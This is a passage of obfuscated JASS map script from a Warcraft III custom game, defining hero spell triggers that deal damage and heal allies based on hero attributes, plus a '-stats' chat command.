call UnitRemoveAbility(Hu,$41305038)
elseif GetSpellAbilityId()==$41305636 then
if GetHeroStr(Hu,false)>GetHeroInt(Hu,false) then
set L9=I2R(GetHeroStr(Hu,true)*10)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitAddAbility(Hu,$41313537)
if GetUnitStatePercent(Nv,UNIT_STATE_LIFE,UNIT_STATE_MAX_LIFE)<30 then
set L9=L9*3
endif
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,10,false,function rD)
set Hc=null
else
set L9=I2R(GetHeroInt(Hu,false)*20)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitAddAbility(Hu,$41313537)
if GetUnitStatePercent(Nv,UNIT_STATE_LIFE,UNIT_STATE_MAX_LIFE)<30 then
set L9=L9*3
endif
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,10,false,function rD)
set Hc=null
endif
call UnitDamageTarget(Hu,Nv,L9,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endif
set Nv=null
set Hu=null
endfunction
function rH takes nothing returns nothing
local unit Hu=GetSummoningUnit()
local unit Nv=GetSummonedUnit()
local location Mc
local integer No
local integer Np
if GetUnitTypeId(Nv)==$68303444 then
set Mc=GetUnitLoc(Hu)
set No=GetUnitAbilityLevel(Hu,$4130554C)
set Np=GetUnitAbilityLevel(Hu,$41305635)
if Np>=1 then
set N5=No
else
set N5=11
endif
call IssuePointOrderLoc(Nv,"cloudoffog",Mc)
call RemoveLocation(Mc)
set Mc=null
endif
set Hu=null
set Nv=null
endfunction
function rI takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function rG)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SUMMON)
call TriggerAddAction(Hc,function rH)
set Hc=null
endfunction
function rJ takes nothing returns boolean
if GetUnitTypeId(MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==$48303443 then
return true
endif
if GetUnitTypeId(MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==$48303654 then
return true
endif
return false
endfunction
function rK takes nothing returns boolean
if not rJ() then
return false
endif
return true
endfunction
function rL takes nothing returns nothing
set SJ[99]=I2R(GetHeroStr(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],false))+I2R(GetHeroInt(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],false))
call SetHeroInt(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],R2I(SJ[99])/2-1,true)
call SetHeroStr(MT[GetConvertedPlayerId(GetTriggerPlayer())-1],R2I(SJ[99])/2+1,true)
endfunction
function rM takes nothing returns nothing
set WV=CreateTrigger()
call TriggerRegisterPlayerChatEvent(WV,Player(0),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(1),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(2),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(3),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(4),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(5),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(6),"-stats",true)
call TriggerRegisterPlayerChatEvent(WV,Player(7),"-stats",true)
call TriggerAddCondition(WV,Condition(function rK))
call TriggerAddAction(WV,function rL)
endfunction
function rN takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rO takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true))*11.+10000.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rP takes nothing returns boolean
if not (GetSpellAbilityId()==$41305453) then
return false
endif
return true
endfunction
function rQ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rR takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true))*7.+1000.*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544C)))*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rS takes nothing returns boolean
if not (GetSpellAbilityId()==$4130544C) then
return false
endif
return true
endfunction
function rT takes nothing returns boolean
if not (GetSpellAbilityId()==$4130544B) then
return false
endif
return true
endfunction
function rU takes nothing returns boolean
if not (GetSpellAbilityId()==$41305451) then
return false
endif
return true
endfunction
function rV takes nothing returns boolean
if not (GetSpellAbilityId()==$41305449) then
return false
endif
return true
endfunction
function rW takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rX takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(2000.+I2R(GetHeroInt(GetTriggerUnit(),true))*9.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rY takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function rZ takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+I2R(GetHeroInt(GetTriggerUnit(),true)+500)*3.*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function ra takes nothing returns boolean
if not (GetSpellAbilityId()==$41305452) then
return false
endif
return true
endfunction
function rb takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rc takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(100*GetUnitAbilityLevel(GetTriggerUnit(),$41305448))+I2R(GetHeroInt(GetTriggerUnit(),true))*5.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rd takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function re takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+(I2R(GetHeroInt(GetTriggerUnit(),true)*2)+I2R(100*GetUnitAbilityLevel(GetTriggerUnit(),$41305448)))*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function rf takes nothing returns boolean
if not (GetSpellAbilityId()==$41305448) then
return false
endif
return true
endfunction
function rg takes nothing returns nothing
if rP() then
set V0=GetSpellTargetLoc()
call CreateNUnitsAtLoc(1,$68303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(2.,$42544C46,GetLastCreatedUnit())
call UnitAddAbility(GetLastCreatedUnit(),$41313532)
set SR=GetUnitsInRangeOfLocMatching(400.,V0,Condition(function rN))
call ForGroupBJ(SR,function rO)
call DestroyGroup(SR)
call RemoveLocation(V0)
else
endif
if rS() then
set V0=GetSpellTargetLoc()
call CreateNUnitsAtLoc(1,$68303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(2.,$42544C46,GetLastCreatedUnit())
call UnitAddAbility(GetLastCreatedUnit(),$41313532)
set SR=GetUnitsInRangeOfLocMatching(400.,V0,Condition(function rQ))
call ForGroupBJ(SR,function rR)
call DestroyGroup(SR)
call RemoveLocation(V0)
else
endif
if rT() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(500+GetHeroInt(GetTriggerUnit(),true))*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544B))*2.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
else
endif
if rU() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(200+GetHeroInt(GetTriggerUnit(),true))*12.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
else
endif
if rV() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(100+GetHeroInt(GetTriggerUnit(),true))*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41305449))+0.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
else
endif
if ra() then
set WX=GetUnitLoc(GetTriggerUnit())
set V0=PolarProjectionBJ(WX,450.,GetUnitFacing(GetTriggerUnit()))
set SR=GetUnitsInRangeOfLocMatching(500.,V0,Condition(function rW))
call ForGroupBJ(SR,function rX)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(500.,V0,Condition(function rY))
call ForGroupBJ(SR,function rZ)
call DestroyGroup(SR)
call RemoveLocation(WX)
call RemoveLocation(V0)
else
endif
if rf() then
set WX=GetUnitLoc(GetTriggerUnit())
set V0=PolarProjectionBJ(WX,450.,GetUnitFacing(GetTriggerUnit()))
set SR=GetUnitsInRangeOfLocMatching(500.,V0,Condition(function rb))
call ForGroupBJ(SR,function rc)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(500.,V0,Condition(function rd))
call ForGroupBJ(SR,function re)
call DestroyGroup(SR)
call RemoveLocation(WX)
call RemoveLocation(V0)
else
endif
endfunction
function rh takes nothing returns nothing
set WW=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WW,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(WW,function rg)
endfunction
function ri takes nothing returns boolean
if not (GetSpellAbilityId()==$4130544A) then
return false
endif
return true
endfunction
function rj takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rk takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true)/7)+100.)*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))+0.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rl takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function rm takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+I2R(GetHeroInt(GetTriggerUnit(),true)/10+70)*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function rn takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function ro takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true)/7)+100.)*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))+0.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rp takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function rq takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+I2R(GetHeroInt(GetTriggerUnit(),true)/10+70)*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function rr takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rs takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true)/7)+100.)*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))+0.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rt takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function ru takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+I2R(GetHeroInt(GetTriggerUnit(),true)/10+70)*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function rv takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function rw takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true)/7)+100.)*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))+0.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function rx takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function ry takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+I2R(GetHeroInt(GetTriggerUnit(),true)/10+70)*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function rz takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function r0 takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(I2R(GetHeroInt(GetTriggerUnit(),true)/7)+100.)*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))+0.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function r1 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function r2 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+I2R(GetHeroInt(GetTriggerUnit(),true)/10+70)*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130544A))*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function r3 takes nothing returns nothing
set WX=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rj))
call ForGroupBJ(SR,function rk)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rl))
call ForGroupBJ(SR,function rm)
call DestroyGroup(SR)
call RemoveLocation(WX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.)
set WX=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rn))
call ForGroupBJ(SR,function ro)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rp))
call ForGroupBJ(SR,function rq)
call DestroyGroup(SR)
call RemoveLocation(WX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.)
set WX=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rr))
call ForGroupBJ(SR,function rs)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rt))
call ForGroupBJ(SR,function ru)
call DestroyGroup(SR)
call RemoveLocation(WX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.)
set WX=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rv))
call ForGroupBJ(SR,function rw)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rx))
call ForGroupBJ(SR,function ry)
call DestroyGroup(SR)
call RemoveLocation(WX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.)
set WX=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function rz))
call ForGroupBJ(SR,function r0)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(800.,WX,Condition(function r1))
call ForGroupBJ(SR,function r2)
call DestroyGroup(SR)
call RemoveLocation(WX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call TriggerSleepAction(1.)
endfunction
function r4 takes nothing returns nothing
set WY=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WY,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(WY,Condition(function ri))
call TriggerAddAction(WY,function r3)
endfunction
function r5 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function r6 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]*((I2R(GetHeroAgi(GetTriggerUnit(),true))+I2R(GetHeroInt(GetTriggerUnit(),true)))*5.))
endfunction
function r7 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function r8 takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),20.*(I2R(GetHeroInt(GetTriggerUnit(),true))+I2R(GetHeroAgi(GetTriggerUnit(),true)))*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function r9 takes nothing returns boolean
if not (GetSpellAbilityId()==$41305251) then
return false
endif
return true
endfunction
function sB takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==false
endfunction
function sC takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]*((I2R(GetHeroAgi(GetTriggerUnit(),true))+I2R(GetHeroInt(GetTriggerUnit(),true)))*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130524A))*.3)))
endfunction
function sD takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function sE takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130524A))*(I2R(GetHeroInt(GetTriggerUnit(),true))+I2R(GetHeroAgi(GetTriggerUnit(),true)))*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function sF takes nothing returns boolean
if not (GetSpellAbilityId()==$4130524A) then
return false
endif
return true
endfunction
function sG takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sH takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6830335A
endfunction
function sI takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6830374A
endfunction
function sJ takes nothing returns boolean
return GetBooleanOr(sH(),sI())
endfunction
function sK takes nothing returns nothing
call IssueImmediateOrder(GetEnumUnit(),"starfall")
endfunction
function sL takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6830335A
endfunction
function sM takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6830374A
endfunction
function sN takes nothing returns boolean
return GetBooleanOr(sL(),sM())
endfunction
function sO takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function sP takes nothing returns boolean
if not (GetSpellAbilityId()==$41304657) then
return false
endif
return true
endfunction
function sQ takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sR takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sS takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sT takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303359
endfunction
function sU takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function sV takes nothing returns boolean
if not (GetSpellAbilityId()==$41305252) then
return false
endif
return true
endfunction
function sW takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sX takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sY takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$48303749) then
return false
endif
return true
endfunction
function sZ takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303359
endfunction
function sa takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function sb takes nothing returns boolean
if not (GetSpellAbilityId()==$4130524C) then
return false
endif
return true
endfunction
function sc takes nothing returns nothing
if r9() then
set Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetSpellTargetLoc()
call CreateNUnitsAtLoc(1,$68303357,GetOwningPlayer(GetTriggerUnit()),Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],bj_UNIT_FACING)
call SetUnitTimeScale(GetLastCreatedUnit(),.3)
call UnitApplyTimedLifeBJ(6.,$42544C46,GetLastCreatedUnit())
call SetUnitFlyHeight(GetLastCreatedUnit(),0.,0.)
call TriggerSleepAction(5.)
set SR=GetUnitsInRangeOfLocMatching(200.,Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Condition(function r5))
call ForGroupBJ(SR,function r6)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(200.,Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Condition(function r7))
call ForGroupBJ(SR,function r8)
call DestroyGroup(SR)
call RemoveLocation(Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
else
endif
if sF() then
set Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetSpellTargetLoc()
call CreateNUnitsAtLoc(1,$68303357,GetOwningPlayer(GetTriggerUnit()),Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],bj_UNIT_FACING)
call SetUnitTimeScale(GetLastCreatedUnit(),.3)
call UnitApplyTimedLifeBJ(6.,$42544C46,GetLastCreatedUnit())
call SetUnitFlyHeight(GetLastCreatedUnit(),0.,0.)
call TriggerSleepAction(5.)
set SR=GetUnitsInRangeOfLocMatching(200.,Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Condition(function sB))
call ForGroupBJ(SR,function sC)
call DestroyGroup(SR)
set SR=GetUnitsInRangeOfLocMatching(200.,Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Condition(function sD))
call ForGroupBJ(SR,function sE)
call DestroyGroup(SR)
call RemoveLocation(Wa[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
else
endif
if sP() then
set V0=GetUnitLoc(GetTriggerUnit())
if sG() then
call CreateNUnitsAtLoc(1,$6830374A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
else
call CreateNUnitsAtLoc(1,$6830335A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
endif
call SetUnitVertexColor(GetLastCreatedUnit(),255,255,255,100)
call RemoveLocation(V0)
call TriggerSleepAction(2.)
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetTriggerUnit()),Condition(function sJ))
call ForGroupBJ(SR,function sK)
call DestroyGroup(SR)
call TriggerSleepAction(5.)
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetTriggerUnit()),Condition(function sN))
call ForGroupBJ(SR,function sO)
call DestroyGroup(SR)
else
endif
if sV() then
set Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetSpellTargetUnit()
set Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitLoc(GetTriggerUnit())
set Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10]=GetUnitLoc(Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call CreateNUnitsAtLoc(1,$68303359,GetOwningPlayer(GetTriggerUnit()),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],bj_UNIT_FACING)
if sQ() then
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,255,255)
else
endif
call SetUnitFlyHeight(GetLastCreatedUnit(),0.,0.)
call CreateNUnitsAtLoc(1,$68303359,GetOwningPlayer(GetTriggerUnit()),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10],bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"creepthunderbolt",Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call SetUnitFlyHeight(GetLastCreatedUnit(),0.,0.)
if sR() then
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,255,255)
else
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,0,255)
endif
call TriggerSleepAction(.5)
call SetUnitPositionLocFacingLocBJ(GetTriggerUnit(),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10],Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call SetUnitPositionLoc(Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call UnitDamageTargetBJ(GetTriggerUnit(),Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],10.*((I2R(GetHeroAgi(GetTriggerUnit(),true))+I2R(GetHeroInt(GetTriggerUnit(),true)))/1.)*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call TriggerSleepAction(4.)
call SetUnitPositionLoc(Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10])
call SetUnitPositionLoc(GetTriggerUnit(),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
if sS() then
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\ShadowAssault.mdx",Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10]))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\ShadowAssault.mdx",Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))
else
endif
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetTriggerUnit()),Condition(function sT))
call ForGroupBJ(SR,function sU)
call DestroyGroup(SR)
set Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=null
call RemoveLocation(Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call RemoveLocation(Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10])
else
endif
if sb() then
set Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetSpellTargetUnit()
set Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitLoc(GetTriggerUnit())
set Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10]=GetUnitLoc(Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call CreateNUnitsAtLoc(1,$68303359,GetOwningPlayer(GetTriggerUnit()),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],bj_UNIT_FACING)
if sW() then
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,255,255)
else
